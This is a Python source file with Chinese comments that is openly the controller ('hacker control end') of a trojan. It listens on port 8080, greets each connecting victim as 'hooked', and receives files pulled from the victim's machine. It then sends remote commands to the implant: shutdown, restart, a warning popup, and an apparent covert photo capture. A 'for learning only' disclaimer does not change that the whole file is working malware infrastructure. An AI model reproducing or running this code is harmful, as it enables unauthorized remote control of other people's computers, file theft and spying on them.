# 黑客 控制端
import os
from socket import *
# 创建一个套接字socket
S = socket()
# 给套接字绑定号码
S.bind(("0.0.0.0",8080)) # IP地址0.0.0.0 默认使用当前IP  端口号（暗号8080）
# PORT端口号:  1024-65535
# 套接字开启监听
S.listen()
os.system("cls")
print('钓鱼中...')
s, addr = S.accept()
print('上钩, IP：', addr[0])

def display_menu(addr):
    print("="*40)
    print(f"        欢迎{addr}上线")
    print("         【仅供学习，非法使用后果自负】")
    print("="*40)
    print("shutdown - 立即关机\t\trestart - 立即重启")
    print("warning - 弹窗警告\t\tphoto - 非礼勿视")
    print("=" * 40)
# 木马申请连接  服务员a, 客户的信息 = 前台.接待()
while True:
    # 接收文件名
    f = s.recv(1024).decode()
    s.send('yes'.encode())
    # 接收文件大小
    filesize = int(s.recv(1024).decode())
    s.send('ok'.encode())
    # 接收内容
    cursize = 0
    with open(f,'wb') as file:
        while True:
            data = s.recv(2048)
            cursize += len(data)
            file.write(data)
            if cursize > filesize:
                break
    s.send('ojbk'.encode())
    if f == '':
        break

display_menu(addr)
while True:
    cmd = input('请输入指令-> ')
    try:
        s.send(cmd.encode())
    except:
        break
    # 把输入的指令发送给木马
    if cmd in ['shutdown', 'restart', 'warning', 'photo']:
        print(s.recv(1024).decode())
        break
    else: print('指令无效 ', end='')
s.close()